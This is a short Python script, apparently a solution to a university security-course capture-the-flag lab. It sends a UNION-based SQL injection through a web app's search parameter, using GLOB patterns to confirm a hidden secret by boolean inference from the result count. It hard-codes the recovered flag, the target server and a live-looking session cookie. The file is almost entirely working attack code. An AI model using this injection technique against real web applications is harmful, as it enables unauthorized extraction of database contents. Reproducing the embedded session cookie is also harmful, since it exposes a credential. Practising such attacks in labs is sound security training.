from itertools import product
import requests

server = 'mustard.stt.rnl.tecnico.ulisboa.pt'
port = 21262
SERVER = f'http://{server}:{port}'
flag = 'in_case_i_forget_my_password_is:_ssof{i_m_blind_but_i_can_still_get_your_data_using_boolean_injection}'
glob = 'In*case*i**SSof{I_m_Blind_but_I_can_Still_gEt_yoUr_datA_using_Boolean_Injection}'
params = {
    'search': f"' UNION SELECT id, secret, 3 FROM super_s_sof_secrets WHERE secret GLOB '{glob}' -- "}
headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
           'Content-Type': 'application/json',
           'Cookie': '_ga=GA1.2.899641607.1581548611; _ga=GA1.3.899641607.1581548611; user=5407626867628042813; _gid=GA1.2.1004854033.1643742476; session=.eJwdjrsOwjAMAP8lM4OT-NmfqRLHFqyFToh_pyDdjSfdu-x5xPNettdxxq3sj1W2kmaInsx9ikP1Ia13N8qWWFeCNmlhAMzNnGWkTNJRgeNXLcpFizqidkBQSmLX2YRwoqRjDCGV0FzgooGMcwF1s6zos_ZRrpHzGcf_praOl3_QFD5f7okxWQ.YfvLMQ.nWWXN2TFloc0mIrpWkFWlw0vbhM'}

r = requests.get(SERVER, params=params, headers=headers)

print("R: ", r.text)
if r.status_code == 200:
    number_of_results = int(r.text.split("<i>Found ", 1)[1][0])

    print("Number of results: ", number_of_results)

    if(number_of_results != 4):
        print("Success: ")
        # return
